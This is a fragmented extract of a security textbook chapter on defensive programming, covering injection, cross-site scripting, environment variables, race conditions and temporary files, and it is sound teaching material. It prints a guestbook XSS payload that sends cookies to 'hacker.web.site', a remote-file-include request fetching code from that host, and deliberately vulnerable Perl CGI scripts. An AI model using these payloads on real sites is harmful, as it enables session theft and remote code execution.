heap overflow
[Word Count: 12]

library function
memory management
nonexecutable memory
no-execute
NOP sled
off-by-one
position independent
[Word Count: 12]

shell
shellcode
stack frame
stack buffer overflow
stack smashing
vulnerability
[Word Count: 10]

10.5 / Key Terms, Review Questions, and Problems   373
[Word Count: 9]

11.1	 Software Security Issues
Introducing Software Security and Defensive Programming
[Word Count: 10]

11.2	 Handling Program Input
Input Size and Buffer Overflow
Interpretation of Program Input
Validating Input Syntax
Input Fuzzing
[Word Count: 18]

11.3	 Writing Safe Program Code
Correct Algorithm Implementation
Ensuring That Machine Language Corresponds to Algorithm
Correct Interpretation of Data Values
Correct Use of Memory
Preventing Race Conditions with Shared Memory
[Word Count: 30]

11.4	 Interacting with the Operating System and Other Programs
Environment Variables
Using Appropriate, Least Privileges
Systems Calls and Standard Library Functions
Preventing Race Conditions with Shared System Resources
Safe Temporary File Use
Interacting with Other Programs
[Word Count: 36]

11.7	 Key Terms, Review Questions, and Problems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Describe how many computer security vulnerabilities are a result of poor
[Word Count: 12]

programming practices.
◆	Describe an abstract view of a program, and detail where potential points
[Word Count: 15]

of vulnerability exist in this view.
◆	Describe how a defensive programming approach will always validate any
[Word Count: 17]

­assumptions made, and is designed to fail gracefully and safely whenever 
­errors occur.
◆	Detail the many problems that occur as a result of incorrectly handling
[Word Count: 26]

­program input, failing to check its size or interpretation.
◆	Describe problems that occur in implementing some algorithm.
◆	Describe problems that occur as a result of interaction between programs
[Word Count: 30]

and O/S components.
◆	Describe problems that occur when generating program output.
[Word Count: 12]

In Chapter 10 we describe the problem of buffer overflows, which continue to be 
one of the most common and widely exploited software vulnerabilities. Although 
we discuss a number of countermeasures, the best defense against this threat is not 
to allow it to occur at all. That is, programs need to be written securely to prevent 
such vulnerabilities occurring.
[Word Count: 59]

More generally, buffer overflows are just one of a range of deficiencies found 
in poorly written programs. There are many vulnerabilities related to program defi-
ciencies that result in the subversion of security mechanisms and allow unauthorized 
access and use of computer data and resources.
[Word Count: 45]

This chapter explores the general topic of software security. We introduce a 
simple model of a computer program that helps identify where security concerns 
may occur. We then explore the key issue of how to correctly handle program input 
to prevent many types of vulnerabilities and more generally, how to write safe 
­program code and manage the interactions with other programs and the operating 
system.
[Word Count: 65]

Introducing Software Security and Defensive Programming
[Word Count: 6]

Many computer security vulnerabilities result from poor programming practices. 
The CWE/SANS Top 25 Most Dangerous Software Errors list, summarized in 
Table 11.1, details the consensus view on the poor programming practices that 
are the cause of the majority of cyber attacks. These errors are grouped into three 
­categories: insecure interaction between components, risky resource management, 
and porous defenses. Similarly, the Open Web Application Security Project Top
[Word Count: 66]

Ten list of critical Web application security flaws includes five related to insecure 
software code. These include unvalidated input, cross-site scripting, buffer over-
flow, injection flaws, and improper error handling. These flaws occur as a conse-
quence of insufficient checking and validation of data and error codes in programs. 
Awareness of these issues is a critical initial step in writing more secure program 
code. Both these sources emphasize the need for software developers to address 
these known areas of concern, and provide guidance on how this is done. We discuss 
most of these flaws in this chapter.
[Word Count: 97]

Table 11.1  CWE/SANS TOP 25 Most Dangerous Software Errors (2011)
[Word Count: 10]

Software Error Category: Insecure Interaction Between Components
[Word Count: 7]

Improper Neutralization of Special Elements used in an SQL Command (“SQL Injection”)
Improper Neutralization of Special Elements used in an OS Command (“OS Command 
Injection”)
Improper Neutralization of Input During Web Page Generation (“Cross-site Scripting”)
Unrestricted Upload of File with Dangerous Type
Cross-Site Request Forgery (CSRF)
URL Redirection to Untrusted Site (“Open Redirect”)
[Word Count: 53]

Software Error Category: Risky Resource Management
[Word Count: 6]

Buffer Copy without Checking Size of Input (“Classic Buffer Overflow”)
Improper Limitation of a Pathname to a Restricted Directory (“Path Traversal”)
Download of Code Without Integrity Check
Inclusion of Functionality from Untrusted Control Sphere
Use of Potentially Dangerous Function
Incorrect Calculation of Buffer Size
Uncontrolled Format String
Integer Overflow or Wraparound
[Word Count: 51]

Software Error Category: Porous Defenses
[Word Count: 5]

Missing Authentication for Critical Function
Missing Authorization
Use of Hard-coded Credentials
Missing Encryption of Sensitive Data
Reliance on Untrusted Inputs in a Security Decision
Execution with Unnecessary Privileges
Incorrect Authorization
Incorrect Permission Assignment for Critical Resource
Use of a Broken or Risky Cryptographic Algorithm
Improper Restriction of Excessive Authentication Attempts
Use of a One-Way Hash without a Salt
[Word Count: 58]

number of bugs in a program, but how often they are triggered, resulting in pro-
gram failure.
[Word Count: 17]

Software security differs in that the attacker chooses the probability distribution, 
targeting specific bugs that result in a failure that can be exploited by the attacker. 
These bugs may often be triggered by inputs that differ dramatically from what is 
­usually expected and hence are unlikely to be identified by common testing approaches. 
Writing secure, safe code requires attention to all aspects of how a program executes, 
the environment it executes in, and the type of data it processes. Nothing can be 
assumed, and all potential errors must be checked. These issues are highlighted in the 
following definition:
[Word Count: 98]

Defensive or Secure Programming is the process of designing and implement-
ing software so that it continues to function even when under attack. Software 
written using this process is able to detect erroneous conditions resulting from 
some attack, and to either continue executing safely, or to fail gracefully. The 
key rule in defensive programming is to never assume anything, but to check all 
assumptions and to handle any possible error states.
[Word Count: 71]

1This figure expands and elaborates on Figure 1-1 in [WHEE03].
[Word Count: 10]

software security is a design goal, addressed from the start of program development, 
a secure program is unlikely to result.
[Word Count: 20]

Further, when changes are required to a program, the programmer often focuses 
on the changes required and what needs to be achieved. Again, defensive program-
ming means that the programmer must carefully check any assumptions made, check 
and handle all possible errors, and carefully check any interactions with existing code. 
Failure to identify and manage such interactions can result in incorrect program 
behavior and the introduction of vulnerabilities into a previously secure program.
[Word Count: 73]

The necessity for security and reliability to be design goals from the incep-
tion of a project has long been recognized by most engineering disciplines. Society 
in general is intolerant of bridges collapsing, buildings falling down, or airplanes 
crashing. The design of such items is expected to provide a high likelihood that these 
c­atastrophic events will not occur. Software development has not yet reached this 
level of maturity, and society tolerates far higher levels of failure in software than
[Word Count: 79]

Executing algorithm,
processing input data,
[Word Count: 5]

in a manner consistent with these assumptions. The two key areas of concern for 
any input are the size of the input and the meaning and interpretation of the input.
[Word Count: 30]

A number of widely used standard C library routines, some listed in Table 10.2, 
compound this problem by not providing any means of limiting the amount of data 
transferred to the space available in the buffer. We discuss a range of safe program-
ming practices related to preventing buffer overflows in Section 10.2. These include 
the use of safe string and buffer copying routines, and an awareness of these soft-
ware security traps by programmers.
[Word Count: 75]

protocols use binary encoding of the requests and responses exchanged between 
parties using these protocols. These are often specified using some abstract syntax 
language, and any specified values must be validated against this specification.
[Word Count: 34]

The 2014 Heartbleed OpenSSL bug, that we discuss further in Section 22.3, is 
a recent example of a failure to check the validity of a binary input value. Because 
of a coding error, failing to check the amount of data requested for return against 
the amount supplied, an attacker could access the contents of adjacent memory. 
This memory could contain information such as user names and passwords, private 
keys, and other sensitive information. This bug potentially compromised a very 
large numbers of servers and their users. It is an example of a buffer over-read.
[Word Count: 94]

More commonly, programs process textual data as input. The raw binary 
­values are interpreted as representing characters, according to some character set. 
Traditionally, the ASCII character set was assumed, although common systems like 
Windows and Mac OS X both use different extensions to manage accented charac-
ters. With increasing internationalization of programs, there is an increasing variety 
of character sets being used. Care is needed to identify just which set is being used, 
and hence just what characters are being read.
[Word Count: 81]

Beyond identifying which characters are input, their meaning must be identified. 
They may represent an integer or floating-point number. They might be a filename, 
a URL, an e-mail address, or an identifier of some form. Depending on how these 
inputs are used, it may be necessary to confirm that the values entered do indeed 
­represent the expected type of data. Failure to do so could result in a vulnerability 
that permits an attacker to influence the operation of the program, with ­possibly 
­serious consequences.
[Word Count: 84]

To illustrate the problems with interpretation of textual input data, we first 
discuss the general class of injection attacks that exploit failure to validate the inter-
pretation of input. We then review mechanisms for validating input data and the 
handling of internationalized inputs using a variety of character sets.
[Word Count: 49]

Consider the example perl CGI script shown in Figure 11.2a, which is designed 
to return some basic details on the specified user using the UNIX finger command. 
This script would be placed in a suitable location on the Web server and invoked in 
response to a simple form, such as that shown in Figure 11.2b. The script retrieves 
the desired information by running a program on the server system, and return-
ing the output of that program, suitably reformatted if necessary, in a HTML 
Web page. This type of simple form and associated handler were widely seen and
[Word Count: 98]

1 #!/usr/bin/perl
2 # finger.cgi - finger CGI script using Perl5 CGI module
3
4 use CGI;
5 use CGI::Carp qw(fatalsToBrowser);
6 $q = new CGI; # create query object
7
8 # display HTML header
9 print $q->header,
10 $q->start_html('Finger User'),
11 $q->h1('Finger User');
12 print "<pre>";
13
14 # get name of user and display their finger details
15 $user = $q->param("user");
16 print `/usr/bin/finger -sh $user`;
17
18 # display HTML footer
19 print "</pre>";
20 print $q->end_html;
[Word Count: 81]

<html><head><title>Finger User</title></head><body></html>
<h1>Finger User</h1>
<form method=post action="finger.cgi">
<b>Username to finger</b>: <input type=text name=user value="">
<p><input type=submit value="Finger User">
</form></body></html>
[Word Count: 19]

Finger User
Login Name     TTY Idle Login Time Where
lpb Lawrie Brown   p0 Sat 15:24 ppp41.grapevine
[Word Count: 16]

Finger User
attack success
-rwxr-xr-x 1 lpb staff 537 Oct 21 16:19 finger.cgi
-rw-r--r-- 1 lpb staff 251 Oct 21 16:14 finger.html
[Word Count: 22]

14 # get name of user and display their finger details
15 $user = $q->param("user");
16 die "The specified user contains illegal characters!"
17 unless ($user =~ /^\w+$/);
18 print `/usr/bin/finger -sh $user`;
[Word Count: 33]

(c) Expected and subverted finger CGI responses
[Word Count: 7]

(d) Safety extension to perl finger CGI script
[Word Count: 8]

2Shell metacharacters are used to separate or combine multiple commands. In this example, the ‘;’ 
­separates distinct commands, run in sequence.
3The use of die to terminate a perl CGI is not recommended. It is used here for brevity in the exam-
ple. However, a well-designed script should display a rather more informative error message about the 
p­roblem and suggest that the user go back and correct the supplied input.
[Word Count: 70]

$name = $_REQUEST['name'];
$query = "SELECT * FROM suppliers WHERE name = '" . $name . "';";
$result = mysql_query($query);
[Word Count: 20]

$name = $_REQUEST['name'];
$query = "SELECT * FROM suppliers WHERE name = '" .
mysql_real_escape_string($name) . "';";
$result = mysql_query($query);
[Word Count: 20]

<?php
include $path . 'functions.php';
include $path . 'data/prefs.php';
…
[Word Count: 10]

GET /calendar/embed/day.php?path=http://hacker.web.site/hack.txt?&cmd=ls
[Word Count: 2]

There are other injection attack variants, including mail injection, format 
string injection, and interpreter injection. New injection attacks variants con-
tinue to be found. They can occur whenever one program invokes the services of 
another program, service, or function and passes to it externally sourced, potentially 
untrusted information without sufficient inspection and validation of it. This just 
emphasizes the need to identify all sources of input, to validate any assumptions 
about such input before use, and to understand the meaning and interpretation of 
values supplied to any invoked program, service, or function.
[Word Count: 92]

4The abbreviation XSS is used for cross-site scripting to distinguish it from the common abbreviation of 
CSS, meaning cascading style sheets.
5HTML character entities allow any character from the character set used to be encoded. For example, &#60; 
represents the “6” character.
[Word Count: 42]

XSS attacks illustrate a failure to correctly handle both program input and 
program output. The failure to check and validate the input results in potentially 
dangerous data values being saved by the program. However, the program is not the 
target. Rather it is subsequent users of the program, and the programs they use to 
access it, which are the target. If all potentially unsafe data output by the program 
are sanitized, then the attack cannot occur. We discuss correct handling of output 
in Section 11.5.
[Word Count: 85]

There are other attacks similar to XSS, including cross-site request for-
gery, and HTTP response splitting. Again the issue is careless use of untrusted, 
unchecked input.
[Word Count: 26]

Thanks for this information, its great!
<script>document.location='http://hacker.web.site/cookie.cgi?'+
document.cookie</script>
[Word Count: 8]

Thanks for this information, its great!
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;
&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;
&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;
&#47;&#47;&#104;&#97;&#99;&#107;&#101;&#114;
&#46;&#119;&#101;&#98;&#46;&#115;&#105;&#116;
&#101;&#47;&#99;&#111;&#111;&#107;&#105;&#101;
&#46;&#99;&#103;&#105;&#63;&#39;&#43;&#100;
&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;
&#99;&#111;&#111;&#107;&#105;&#101;&#60;&#47;
&#115;&#99;&#114;&#105;&#112;&#116;&#62;
[Word Count: 17]

If the input data fail the comparison, they could be rejected. In this case a 
suitable error message should be sent to the source of the input to allow it to be 
corrected and reentered. Alternatively, the data may be altered to conform. This 
generally involves escaping metacharacters to remove any special interpretation, 
thus rendering the input safe.
[Word Count: 58]

Consider the consequences of multiple encodings when validating input. 
There is a class of attacks that attempt to supply an absolute pathname for a file to 
a script that expects only a simple local filename. The common check to ­prevent 
this is to ensure that the supplied filename does not start with “/” and does not 
­contain any “../” parent directory references. If this check only assumes the correct,
[Word Count: 69]

Given the possibility of multiple encodings, the input data must first be 
transformed into a single, standard, minimal representation. This process is called 
canonicalization and involves replacing alternate, equivalent encodings by one 
common value. Once this is done, the input data can then be compared with a 
­single representation of acceptable input values. There may potentially be a large 
number of input and output fields that require checking. [SIMP11] and others 
recommend the use of anti-XSS libraries, or web UI frameworks with integrated 
XSS protection, that automate much of the checking process, rather than writing 
explicit checks for each field.
[Word Count: 100]

Clearly, there is a problem anticipating and testing for all potential types of non-
standard inputs that might be exploited by an attacker to subvert a program.  
A powerful, alternative approach called fuzzing was developed by Professor
[Word Count: 37]

Professor Miller’s team has applied fuzzing tests to a number of common 
operating systems and applications. These include common command-line and GUI 
applications running on Linux, Windows NT, and, most recently, Mac OS X. The 
results of the latest tests are summarized in [MILL07], which identifies a number of 
programs with bugs in these various systems. Other organizations have used these 
tests on a variety of systems and software.
[Word Count: 69]

While fuzzing is a conceptually very simple testing method, it does have its 
limitations. In general, fuzzing only identifies simple types of faults with handling of 
input. If a bug exists that is only triggered by a small number of very specific input 
values, fuzzing is unlikely to locate it. However, the types of bugs it does locate are 
very often serious and potentially exploitable. Hence it ought to be deployed as a 
component of any reasonably comprehensive testing strategy.
[Word Count: 80]

From a software security perspective, the key issues are whether the imple-
mented algorithm correctly solves the specified problem, whether the machine 
instructions executed correctly represent the high-level algorithm specification, and 
whether the manipulation of data values in variables, as stored in machine registers 
or memory, is valid and meaningful.
[Word Count: 50]

Another well-known example is the TCP session spoof or hijack attack. This 
extends the concept we discussed in Section 7.1 of sending source spoofed packets 
to a TCP server. In this attack, the goal is not to leave the server with half-open 
­connections, but rather to fool it into accepting packets using a spoofed source 
address that belongs to a trusted host but actually originates on the attacker’s
[Word Count: 68]

These examples illustrate the care that is needed when designing and imple-
menting a program. It is important to specify assumptions carefully, such as that 
­generated random number should indeed be unpredictable, in order to ensure that 
these assumptions are satisfied by the resulting program code. It is also very impor-
tant to identify debugging and testing extensions to the program and to ensure that 
they are removed or disabled before the program is distributed and used.
[Word Count: 77]

Ensuring That Machine Language Corresponds to Algorithm
[Word Count: 7]

The second issue concerns the correspondence between the algorithm specified in 
some programming language and the machine instructions that are run to imple-
ment it. This issue is one that is largely ignored by most programmers. The assump-
tion is that the compiler or interpreter does indeed generate or execute code that 
validly implements the language statements. When this is considered, the issue is 
typically one of efficiency, usually addressed by specifying the required level of 
optimization flags to the compiler.
[Word Count: 81]

The development of trusted computer systems with very high assurance level 
is the one area where this level of checking is required. Specifically, certification 
of computer systems using a Common Criteria assurance level of EAL 7 requires 
validation of the correspondence among design, source code, and object code. We 
discuss this further in Chapter 13.
[Word Count: 55]

The next issue concerns the correct interpretation of data values. At the most basic 
level, all data on a computer are stored as groups of binary bits. These are generally 
saved in bytes of memory, which may be grouped together as a larger unit, such as a 
word or longword value. They may be accessed and manipulated in memory, or they
[Word Count: 61]

6Provided that the compiler or interpreter does not contain any bugs in the translation of the high-level 
language statements to the machine instructions actually executed.
[Word Count: 25]

Many older languages, including C, provide no explicit support for dynami-
cally allocated memory. Instead support is provided by explicitly calling standard 
library routines to allocate and release memory. Unfortunately, in large, complex 
programs, determining exactly when dynamically allocated memory is no longer 
required can be a difficult task. As a consequence, memory leaks in such ­programs 
can easily occur and can be difficult to identify and correct. There are library 
­variants that implement much higher levels of checking and debugging such alloca-
tions that can be used to assist this process.
[Word Count: 92]

Other languages like Java and C + + manage memory allocation and release 
automatically. While such languages do incur an execution overhead to support this 
automatic management, the resulting programs are generally far more reliable. The 
use of such languages is strongly encouraged to avoid memory management problems.
[Word Count: 48]

Preventing Race Conditions with Shared Memory
[Word Count: 6]

11.4	Interacting with the Operating System and
[Word Count: 7]

The third component of our model of computer programs is that it executes on a 
computer system under the control of an operating system. This aspect of a ­computer 
program is often not emphasized in introductory programming courses; however, 
from the perspective of writing secure software, it is critical. Excepting dedicated 
embedded applications, in general, programs do not run in isolation on most 
­computer systems. Rather, they run under the control of an operating system that 
mediates access to the resources of that system and shares their use between all the 
currently executing programs.
[Word Count: 94]

The operating system constructs an execution environment for a process when 
a program is run, as illustrated in Figure 10.4. In addition to the code and data for
[Word Count: 28]

11.4 / Interacting with the Operating System   397
[Word Count: 8]

the program, the process includes information provided by the operating system. 
These include environment variables, which may be used to tailor the operation of 
the program, and any command-line arguments specified for the program. All such 
data should be considered external inputs to the program whose values need valida-
tion before use, as we discuss in Section 11.2.
[Word Count: 58]

Generally these systems have a concept of multiple users on the system. 
Resources, like files and devices, are owned by a user and have permissions granting 
access with various rights to different categories of users. We discuss these concepts 
further in Chapter 4. From the perspective of software security, programs need 
access to the various resources, such as files and devices, they use. Unless appropri-
ate access is granted, these programs will likely fail. However, excessive levels of 
access are also dangerous because any bug in the program could then potentially 
compromise more of the system.
[Word Count: 96]

There are also concerns when multiple programs access shared resources, 
such as a common file. This is a generalization of the problem of managing access to 
shared memory, which we discuss in Section 11.3. Many of the same concerns apply, 
and appropriate synchronization mechanisms are needed.
[Word Count: 46]

We now discuss each of these issues in more detail.
[Word Count: 10]

Well-known environment variables include the variable PATH, which speci-
fies the set of directories to search for any given command; IFS, which specifies the 
word boundaries in a shell script; and LD_LIBRARY_PATH, which specifies the list of 
directories to search for dynamically loadable libraries. All of these have been used 
to attack programs.
[Word Count: 53]

The security concern for a program is that these provide another path for 
untrusted data to enter a program and hence need to be validated. The most com-
mon use of these variables in an attack is by a local user on some system attempting 
to gain increased privileges on the system. The goal is to subvert a program that 
grants superuser or administrator privileges, coercing it to run code of the attacker’s 
selection with these higher privileges.
[Word Count: 78]

Some of the earliest attacks using environment variables targeted shell scripts 
that executed with the privileges of their owner rather than the user running them. 
Consider the simple example script shown in Figure 11.6a. This script, which might 
be used by an ISP, takes the identity of some user, strips any domain specification if 
included, and then retrieves the mapping for that user to an IP address. Because that
[Word Count: 69]

#!/bin/bash
user=`echo $1   |sed 's/@.*$//'`
grep $user /var/local/accounts/ipaddrs
[Word Count: 8]

#!/bin/bash
PATH="/sbin:/bin:/usr/sbin:/usr/bin"
export PATH
user=`echo $1   |sed 's/@.*$//'`
grep $user /var/local/accounts/ipaddrs
[Word Count: 11]

(a) Example vulnerable privileged shell script
[Word Count: 6]

(b) Still vulnerable privileged shell script
[Word Count: 6]

Lastly, apart from the standard environment variables, many programs 
use custom variables to permit users to generically change their behavior just by 
­setting appropriate values for these variables in their startup scripts. Again, such 
use means these variables constitute untrusted input to the program that needs to 
be validated. One particular danger is to merge values from such a variable with 
other information into some buffer. Unless due care is taken, a buffer ­overflow
[Word Count: 74]

11.4 / Interacting with the Operating System   399
[Word Count: 8]

can occur, with consequences as we discuss in Chapter 10. Alternatively, any of the 
issues with correct interpretation of textual information we discuss in Section 11.2 
could also apply.
[Word Count: 29]

All of these examples illustrate how care is needed to identify the way in which 
a program interacts with the system in which it executes and to carefully consider 
the security implications of these assumptions.
[Word Count: 35]

Another concern is ensuring that any privileged program can modify only those 
files and directories necessary. A common deficiency found with many ­privileged 
programs is for them to have ownership of all associated files and directories. If 
the program is then compromised, the attacker has greater scope for modifying and
[Word Count: 50]

7Privileged network services use port numbers less than 1024. On UNIX and related systems, only the 
root user is granted the privilege to bind to these ports.
[Word Count: 27]

11.4 / Interacting with the Operating System   401
[Word Count: 8]

the server programs could reduce their user privileges to those of another special 
­system user. Any subsequent attack is then much less significant. The problems 
resulting from the numerous security bugs in the once widely used sendmail mail 
delivery program are a direct consequence of it being a large, complex monolithic 
program that ran continuously as the root user.
[Word Count: 59]

Systems Calls and Standard Library Functions
[Word Count: 6]

interactions and explicitly codes for them, the resulting program may not perform 
as expected.
[Word Count: 14]

• When the file is opened for writing, the system will write the new data to
[Word Count: 16]

same disk blocks as the original data. In practice, the operating system may 
well assume that the existing data are no longer required, remove them from 
­association with the file, and then allocate new unused blocks to write the data 
to. What the program should do is open the file for update, indicating to the 
operating system that the existing data are still required.
 
• When the file is overwritten with pattern, the data are written immediately
[Word Count: 77]

• When the I/O buffers are flushed and the file is closed, the data are then written
[Word Count: 17]

11.4 / Interacting with the Operating System   403
[Word Count: 8]

required. The program must insist that the file system synchronize the data 
with the values on the device in order to ensure that the data are ­physically 
­transferred to the device. However, doing this results in a performance ­penalty 
on the system because it forces device accesses to occur at less than ­optimal 
times. This penalty impacts not just this file shredding program but every 
­program currently running on the system.
[Word Count: 71]

With these changes, the algorithm for a secure file shredding program changes 
to that shown in Figure 11.7b. This is certainly more likely to achieve the desired 
result; however, examined more closely, there are yet more concerns.
[Word Count: 37]

Figure 11.7  Example Global Data Overflow Attack
[Word Count: 7]

8The Mac OS X F_FULLFSYNC fcntl system call commands the drive to flush all buffered data to 
­permanent storage.
[Word Count: 19]

patterns = [10101010, 01010101, 11001100, 00110011, 00000000, 11111111,
. . .]
open file for writing
for each pattern
    seek to start of file
    overwrite file contents with pattern
close file
remove file
[Word Count: 32]

(a) Initial secure file shredding program algorithm
[Word Count: 7]

patterns = [10101010, 01010101, 11001100, 00110011, 00000000, 11111111,
. . .]
open file for update
for each pattern
    seek to start of file
    overwrite file contents with pattern
    flush application write buffers
    sync file system write buffers with device
close file
remove file
[Word Count: 43]

(b) Better secure file shredding program algorithm
[Word Count: 7]

problems. If the device is a nonmagnetic disk (a flash memory drive, for example), 
then their controllers try to minimize the number of writes to any block. This is 
because such devices only support a limited number of rewrites to any block. Instead 
they may allocate new blocks when data are rewritten instead of reusing the existing 
block. Also, some types of journaling file systems keep records of all changes made 
to files to enable fast recovery after a disk crash. But these records can be used to 
access previous data contents.
[Word Count: 92]

Venema concludes his discussion by noting that in fact the program may actu-
ally be solving the wrong problem. Rather than trying to destroy the file contents 
before deletion, a better approach may in fact be to overwrite all currently unused 
blocks in the file systems and swap space, including those recently released from 
deleted files.
[Word Count: 56]

Preventing Race Conditions with Shared System Resources
[Word Count: 7]

11.4 / Interacting with the Operating System   405
[Word Count: 8]

There are more modern and alternative locking mechanisms available for 
files. These may be advisery and/or mandatory, where the operating system guaran-
tees that a locked file cannot be accessed inappropriately. The issue with mandatory 
locks is the mechanisms for removing them should the locking process crash or oth-
erwise not release the lock. These mechanisms are also implemented differently on 
different operating systems. Hence care is needed to ensure that the chosen mecha-
nism is used correctly.
[Word Count: 78]

Figure 11.8 illustrates the use of the advisory flock call in a perl script. This 
might typically be used in a Web CGI form handler to append information provided 
by a user to this file. Subsequently another program, also using this locking mecha-
nism, could access the file and process and remove these details. Note that there 
are subtle complexities related to locking files using different types of read or write 
access. Suitable program or function references should be consulted on the correct 
use of these features.
[Word Count: 87]

#!/usr/bin/perl
#
$EXCL_LOCK = 2;
$UNLOCK     = 8;
$FILENAME    = "forminfo.dat";
[Word Count: 11]

# open data file and acquire exclusive access lock
open (FILE, ">> $FILENAME") | | die "Failed to open $FILENAME \n";
flock FILE, $EXCL_LOCK;
… use exclusive access to the forminfo file to save details
# unlock and close file
flock FILE, $UNLOCK;
close(FILE);
[Word Count: 44]

9Tripwire is used to scan all directories and files on a system, detecting any important files that have 
­unauthorized changes. Tripwire can be used to detect attempts to subvert the system by an attacker. It can 
also detect incorrect program behavior that is causing unexpected changes to files.
[Word Count: 48]

11.4 / Interacting with the Operating System   407
[Word Count: 8]

unlinked. Perl programmers can use the File::Temp module for secure temporary file 
creation. Programmers using other languages should consult appropriate references 
for suitable methods.
[Word Count: 24]

When the file is created in a shared temporary directory, the access permis-
sions should specify that only the owner of the temporary file, or the system adminis-
trators, should be able to remove it. This is not always the default permission setting, 
which must be corrected to enable secure use of such files. On Linux and UNIX 
systems this requires setting the sticky permission bit on the temporary directory, as 
we discuss in Sections 4.4 and 25.3.
[Word Count: 78]

A further concern relates to protecting the confidentiality and integrity of 
the data flowing among various programs. When these programs are running on 
the same computer system, appropriate use of system functionality such as pipes or 
temporary files provides this protection. If the programs run on different systems, 
linked by a suitable network connection, then appropriate security mechanisms 
should be employed by these network connections. Alternatives include the use 
of IP Security (IPSec), Transport Layer/Secure Socket Layer Security (TLS/SSL), 
or Secure Shell (SSH) connections. Even when using well regarded, standardized
[Word Count: 90]

char *filename;
int fd;
do {
   filename = tempnam (NULL, "foo");
   fd = open (filename, O CREAT | O EXCL | O TRUNC | O RDWR, 0600);
   free (filename);
} while (fd == –1);
[Word Count: 34]

Figure 11.9  C Temporary File Creation Example
[Word Count: 7]

protocols, care is needed to ensure they use strong cryptography, as weaknesses 
have been found in a number of algorithms and their implementations [SIMP11]. 
We discuss some of these alternatives in Chapter 22.
[Word Count: 33]

Suitable detection and handling of exceptions and errors generated by ­program 
interaction is also important from a security perspective. When one process invokes 
another program as a child process, it should ensure that the program ­terminates 
correctly and accept its exit status. It must also catch and process signals resulting 
from interaction with other programs and the operating system.
[Word Count: 59]

Consider two examples. The first involves simple text-based programs run on 
classic time-sharing systems when purely textual terminals, such as the VT100, were 
used to interact with the system.10 Such terminals often supported a set of function 
keys, which could be programmed to send any desired sequence of characters when 
pressed. This programming was implemented by sending a special escape sequence.11 
The terminal would recognize these sequences and, rather than displaying the char-
acters on the screen, would perform the requested action. In addition to program-
[Word Count: 86]

10Common terminal programs typically emulate such a device when interacting with a command-line 
shell on a local or remote system.
11So designated because such sequences almost always started with the escape (ESC) character from the 
ASCII character set.
[Word Count: 38]

The second example is the classic cross-site scripting (XSS) attack using a 
guestbook on some Web server. If the guestbook application fails adequately to 
check and sanitize any input supplied by one user, then this can be used to imple-
ment an attack on users subsequently viewing these comments. This attack exploits 
the assumptions and security models used by Web browsers when viewing content 
from a site. Browsers assume all of the content was generated by that site and is
[Word Count: 80]

equally trusted. This allows programmable content like JavaScript to access and 
manipulate data and metadata at the browser site, such as cookies associated with 
that site. The issue here is that not all data were generated by, or under the control 
of, that site. Rather the data came from some other, untrusted user.
[Word Count: 53]

[MCGR06] updates and extends [VIEG01], and both are widely cited as key 
­references discussing the general topic of software security. [HOWA07] discusses 
many specific details on writing secure code for Microsoft Windows systems, and 
[WHEE03] provides similar details for Linux and UNIX systems. [NIST04] ­provides 
a set of general principles for IT security that can be applied specifically to software 
security. [SIMP11] describes a set of industry best secure development ­practices,
[Word Count: 71]

successfully used by SAFECode members. [MILL07] is the latest in a series of 
papers by these authors discussing the use of fuzzing to test applications running on 
common operating systems. [LAND94] is a useful compilation of security flaws in 
program code, well worth studying.
[Word Count: 44]

HOWA07  Howard, M., and LeBlanc, D. Writing Secure Code for Windows Vista.
[Word Count: 12]

Redmond, WA: Microsoft Press, 2007.
LAND94	
Landwehr, C., et al. “A Taxonomy of Computer Program Security Flaws.” 
ACM Computing Surveys, Volume 26 Issue 3, September 1994.
MCGR06	 McGraw, G. Software Security: Building Security In. Reading, MA:
[Word Count: 36]

11.7	Key Terms, Review Questions, and Problems
[Word Count: 7]

atomic operation
canonicalization
code injection
command injection
cross-site scripting
[Word Count: 9]

environment variable
fuzzing
injection attack
least privilege
memory leak
privilege escalation
race condition
[Word Count: 13]

regular expression
secure programming
software quality
software reliability
software security
SQL injection
XSS reflection
[Word Count: 14]

11.1	
Define the difference between software quality and reliability and software security.
	 11.2	
Define defensive programming.
	 11.3	
List some possible sources of program input.
	 11.4	
Define an injection attack. List some examples of injection attacks. What are the 
­general circumstances in which injection attacks are found?
[Word Count: 46]

11.7 Key Terms, Review Questions, and Problems   413
[Word Count: 8]

11.8	
Another approach to improving program safety is to use a static analysis tool, which 
scans the program source looking for known program deficiencies. Identity some suit-
able static analysis tools for a language that you know. Determine the cost, availability, 
and ease of use of these tools. Indicate the types of development projects they would 
be suitable to use in.
[Word Count: 61]

Figure 11.10  Comment Form Handler Exercise
[Word Count: 6]

#!/usr/bin/perl
# comment.cgi - send comment to webmaster
# specify recipient of comment email
$to = "webmaster";
[Word Count: 17]

use CGI;
use CGI::Carp qw(fatalsToBrowser);
$q = new CGI; #        create query object
[Word Count: 13]

# display HTML header
print $q->header,
$q->start_html('Comment Sent'),
$q->h1('Comment Sent');
[Word Count: 10]

# retrieve form field values and send comment to webmaster
$subject = $q->param("subject");
$from = $q->param("from");
$body = $q->param("body");
[Word Count: 19]

# generate and send comment email
system("export REPLYTO=\"$from\"; echo \"$body\" | mail -s \"$subject\"
$to");
[Word Count: 15]

# indicate to user that email was sent
print "Thank you for your comment on $subject.";
print "This has been sent to $to.";
[Word Count: 23]

# display HTML footer
print $q->end_html;
[Word Count: 6]

<html><head><title>Send a Comment</title></head><body>
<h1> Send a Comment </h1>
<form method=post action="comment.cgi">
<b>Subject of this comment</b>: <input type=text name=subject 
value="">
<b>Your Email Address</b>: <input type=text name=from value="">
<p>Please enter comments here:
<p><textarea name="body" rows=15 cols=50></textarea>
<p><input type=submit value="Send Comment">
<input type="reset" value="Clear Form">
</form></body></html>
[Word Count: 43]

11.7 Key Terms, Review Questions, and Problems   415
[Word Count: 8]

12.1	 Introduction To Operating System Security
[Word Count: 6]

12.3	 Operating Systems Hardening
Operating System Installation: Initial Setup and Patching
Remove Unnecessary Services, Application, and Protocols
Configure Users, Groups, and Authentication
Configure Resource Controls
Install Additional Security Controls
Test the System Security
[Word Count: 33]

12.4	 Application Security
Application Configuration
Encryption Technology
[Word Count: 7]

12.5	 Security Maintenance
Logging
Data Backup and Archive
[Word Count: 8]

12.6	 Linux/Unix Security
